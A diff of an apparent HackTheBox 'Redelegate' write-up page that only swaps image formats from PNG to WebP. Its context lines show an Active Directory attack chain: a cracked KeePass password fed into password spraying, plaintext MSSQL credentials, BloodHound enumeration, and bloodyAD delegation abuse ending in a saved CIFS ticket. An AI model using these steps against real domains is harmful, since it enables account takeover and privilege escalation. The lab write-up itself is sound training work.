@@ -137,7 +137,7 @@ Fall2024!   (Shared)
         <p>Open the database in KeePassXC with <code>Fall2024!</code>. Each stored entry's password is another candidate credential — dump them all into the spray list alongside the seasonal ones:</p>
 
         <figure>
-          <img src="../assets/img/htb-redelegate/img1.png" alt="The unlocked KeePass database open in KeePassXC">
+          <img src="../assets/img/htb-redelegate/img1.webp" alt="The unlocked KeePass database open in KeePassXC">
           <figcaption>KeePassXC opened with the cracked master password — every entry is a credential to spray.</figcaption>
         </figure>
 
@@ -162,7 +162,7 @@ MSSQL  10.129.11.197  1433  DC  [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii</code></pre
         <pre><code>bloodhound-python -u Marie.Curie -p &#x27;Fall2024!&#x27; -d redelegate.vl -ns 10.129.11.197 -c ALL --zip</code></pre>
 
         <figure>
-          <img src="../assets/img/htb-redelegate/img2.png" alt="BloodHound showing Marie.Curie&#x27;s ForceChangePassword edge to helen.frost">
+          <img src="../assets/img/htb-redelegate/img2.webp" alt="BloodHound showing Marie.Curie&#x27;s ForceChangePassword edge to helen.frost">
           <figcaption>BloodHound: <code>Marie.Curie</code> holds ForceChangePassword over <code>helen.frost</code>.</figcaption>
         </figure>
 
@@ -185,7 +185,7 @@ SeMachineAccountPrivilege     Add workstations to domain                        
 SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation   Enabled</code></pre>
 
         <figure>
-          <img src="../assets/img/htb-redelegate/img3.png" alt="Enumerating helen.frost&#x27;s delegation-related rights">
+          <img src="../assets/img/htb-redelegate/img3.webp" alt="Enumerating helen.frost&#x27;s delegation-related rights">
           <figcaption>Enumerating helen.frost's rights — <code>SeEnableDelegationPrivilege</code> plus control over a computer object.</figcaption>
         </figure>
 
@@ -215,7 +215,7 @@ bloodyAD -d redelegate.vl -k --host dc.redelegate.vl \
 [*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache</code></pre>
 
         <figure>
-          <img src="../assets/img/htb-redelegate/img4.png" alt="Setting TRUSTED_TO_AUTH_FOR_DELEGATION on the FS01$ computer account">
+          <img src="../assets/img/htb-redelegate/img4.webp" alt="Setting TRUSTED_TO_AUTH_FOR_DELEGATION on the FS01$ computer account">
           <figcaption><code>FS01$</code> flagged <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> — protocol transition enabled.</figcaption>
         </figure>
 
